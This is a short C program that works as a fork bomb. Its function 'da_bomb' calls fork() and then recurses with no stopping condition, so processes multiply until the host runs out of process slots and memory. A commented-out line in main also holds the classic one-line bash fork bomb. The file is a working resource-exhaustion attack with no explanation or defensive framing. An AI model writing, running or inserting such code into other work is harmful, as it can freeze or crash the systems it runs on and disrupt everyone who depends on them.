#include <unistd.h>


void da_bomb() {
    fork();
    da_bomb();
}

int main() {
    // char* args[] = {":(){ :|:& };:", NULL};
    // execvp(":(){ :|:& };:", args);
    da_bomb();
    return 0;
}